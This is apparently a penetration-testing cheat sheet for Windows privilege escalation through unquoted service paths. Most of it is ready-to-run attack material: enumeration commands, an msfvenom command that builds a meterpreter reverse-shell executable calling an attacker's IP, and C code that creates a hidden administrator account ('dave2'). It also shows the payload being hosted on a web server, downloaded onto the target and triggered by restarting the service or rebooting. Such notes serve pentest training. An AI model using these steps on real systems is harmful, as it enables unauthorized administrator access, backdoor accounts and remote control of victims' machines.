We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.

Each Windows service maps to an executable file that will be run when the service is started. If the path of this file contains one or more spaces and is not enclosed within quotes, it is potentially vulnerable.
# Enumerate running services:
Powershell:
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
CMD one-liner:
```batch
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
# Enumerate File Permissions
Check every path with spaces to see if it's writeable. 

i.e. The following example unqouted service path: C:\Program Files\My Program\My Service\service.exe will have the following paths checked by windows:
* C:\Program.exe
* C:\Program Files\My.exe
* C:\Program Files\My Program\My.exe
* C:\Program Files\My Program\My service\service.exe

Thus the following folders need to be checked for (W) permissions:
* C:\Program Files
* C:\Program Files\My Program
* C:\Program Files\My Program\My service
```batch
icacls "C:\Path"
```
# Craft and place malicious exe in service path
Generate payload with msfvenom:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$(IP_ADDRESS) LPORT=$(PORT) -f exe -o service.exe
```
Or
Example malicious service to use:
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
On kali, cross-compile the service:
```batch
x86_64-w64-mingw32-gcc adduser.c -o service.exe
```
# Configure webserver to host file for transfer
```bash
python -m http.server 80
```
Remember to set up a listener if the service payload is a revshell!

Transfer file to target machine at the vulnerable service path:
```powershell
iwr -uri http://$(IP_ADDRESS)/service.exe -Outfile "C:\Vulnerable\Service\Path.exe"
```
# Restart service
Either restart revice manually or reboot the target (assuming the service is set to automatic startup)
```batch
net stop $SERVICE
```
```batch
net start $SERVICE
```
```batch
shutdown /r /t 0
```
